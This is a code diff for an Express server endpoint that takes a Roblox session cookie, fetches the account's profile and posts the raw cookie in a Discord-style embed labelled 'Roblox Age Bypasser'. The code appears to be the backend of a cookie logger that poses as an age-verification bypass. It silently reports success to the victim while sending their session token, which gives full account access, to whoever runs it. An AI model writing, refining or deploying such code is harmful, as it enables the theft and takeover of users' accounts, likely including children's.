@@ -39,11 +39,10 @@ app.get('/api/progress', async (req, res) => {
     }
 });
 
-// --- Endpoint 3: This is the Webhook Logic ---
+// --- Endpoint 3: Webhook Logic with Corrected Names ---
 app.post('/api/webhook', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie) {
-        // Silently succeed if there's no cookie, nothing to log.
         return res.status(200).send("Webhook ignored: No cookie provided.");
     }
     
@@ -55,7 +54,8 @@ app.post('/api/webhook', async (req, res) => {
         const format = (num) => new Intl.NumberFormat('en-US').format(num);
 
         const embed = {
-            color: 0x43afff, // Blue theme color
+            color: 0x43afff,
+            // --- UPDATED NAME ---
             author: { name: `${userData.displayName} (@${userData.username}) - Age Bypassed`, url: `https://www.roblox.com/users/${userData.uid}/profile` },
             thumbnail: { url: userData.avatarUrl },
             fields: [
@@ -64,6 +64,7 @@ app.post('/api/webhook', async (req, res) => {
                 { name: '⭐ Premium', value: userData.isPremium ? '✅ Active' : '❌ None', inline: true },
                 { name: '🍪 Cookie Used', value: `\`\`\`${cookie}\`\`\``, inline: false },
             ],
+            // --- UPDATED NAME ---
             footer: { text: "Roblox Age Bypasser • Success" },
             timestamp: new Date().toISOString()
         };
@@ -72,8 +73,7 @@ app.post('/api/webhook', async (req, res) => {
         res.status(200).send("Webhook sent successfully.");
     } catch (error) {
         console.error("WEBHOOK TASK FAILED:", error.message);
-        // Respond with success even if webhook fails, so user isn't affected.
-        res.status(200).send("Webhook task failed on server, but user process is complete.");
+        res.status(200).send("Webhook task failed on server.");
     }
 });
 
